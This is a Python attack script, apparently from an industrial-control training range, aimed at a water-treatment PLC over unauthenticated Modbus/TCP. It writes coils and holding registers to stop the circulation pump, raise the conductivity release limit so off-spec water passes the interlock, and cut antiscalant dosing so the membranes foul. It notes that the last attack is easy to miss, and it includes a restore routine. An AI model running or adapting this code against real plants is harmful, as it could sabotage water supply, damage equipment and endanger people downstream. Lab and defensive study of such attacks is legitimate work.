#!/usr/bin/env python3
"""Scenarios 4 and 5, Modbus/TCP against plc-water (the RO demineralisation
plant). No authentication exists in the protocol, so a bare pymodbus client is
the whole exploit.

  modbus_attack.py enum                enumerate coils and registers
  modbus_attack.py stop-loop           stop the DI loop circulation pump (scenario 4)
  modbus_attack.py raise-limit [us]    raise the release conductivity limit (scenario 5, default 5.0)
  modbus_attack.py starve-antiscalant  cut antiscalant dosing -> membranes foul
  modbus_attack.py restore             put the setpoints and modes back
"""
import sys

from pymodbus.client import ModbusTcpClient

import targets as T

# from plc-water/mapfile.py
CO_P101_ANTISCALANT, CO_P401_LOOP = 0, 4
CO_P101_HAND, CO_P401_HAND = 9, 13
HR_LOOP_PRESS_SP, HR_ANTISCALANT_RATE = 0, 3
HR_NAOH_RATE, HR_COND_LIMIT = 4, 5

c = ModbusTcpClient(T.guard(T.PLC_WATER), port=T.MODBUS_PORT, timeout=3)
c.connect()


def enum():
    co = c.read_coils(0, 24, slave=1)
    di = c.read_discrete_inputs(0, 16, slave=1)
    hr = c.read_holding_registers(0, 24, slave=1)
    ir = c.read_input_registers(0, 16, slave=1)
    print("coils    :", list(map(int, co.bits[:24])))
    print("discrete :", list(map(int, di.bits[:16])))
    print("holding  :", hr.registers)
    print("input    :", ir.registers)
    print("\nno auth, no session, no signing. read is write.")
    print("HR5 is the release conductivity limit; HR0 the loop pressure setpoint.")


def stop_loop():
    print("[*] P401 (loop circulation pump) -> HAND, then STOP")
    c.write_coil(CO_P401_HAND, True, slave=1)
    c.write_coil(CO_P401_LOOP, False, slave=1)
    print("    3PITC401 loop pressure will bleed to zero; the point-of-use")
    print("    (Mischerei) loses supply. Watch the power HMI equivalent, PT-401.")


def raise_limit():
    us = float(sys.argv[2]) if len(sys.argv) > 2 else 5.0
    print(f"[*] writing HR5 (release conductivity limit) = {us:.2f} uS/cm "
          f"({int(us * 100)})")
    c.write_register(HR_COND_LIMIT, int(us * 100), slave=1)
    print("    the 'Freigabe an Mischerei' interlock now passes water that is")
    print("    far off-spec. Pair with starve-antiscalant to actually degrade it.")


def starve_antiscalant():
    print("[*] P101 (antiscalant metering pump) -> HAND + STOP, rate -> 0")
    c.write_coil(CO_P101_HAND, True, slave=1)
    c.write_coil(CO_P101_ANTISCALANT, False, slave=1)
    c.write_register(HR_ANTISCALANT_RATE, 0, slave=1)
    print("    with no scale inhibitor the RO membranes foul: 1QAH301 climbs")
    print("    over ~30 s, then 2QAH401 follows. Slow, and easy to miss.")


def restore():
    for coil in (CO_P101_HAND, CO_P401_HAND):
        c.write_coil(coil, False, slave=1)
    c.write_register(HR_COND_LIMIT, 200, slave=1)      # 2.00 uS/cm
    c.write_register(HR_LOOP_PRESS_SP, 380, slave=1)   # 3.80 bar
    c.write_register(HR_ANTISCALANT_RATE, 25, slave=1)  # 2.5 L/h
    print("[*] setpoints and modes restored")


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "enum"
    {"enum": enum, "stop-loop": stop_loop, "raise-limit": raise_limit,
     "starve-antiscalant": starve_antiscalant, "restore": restore}.get(
        cmd, lambda: print(__doc__))()
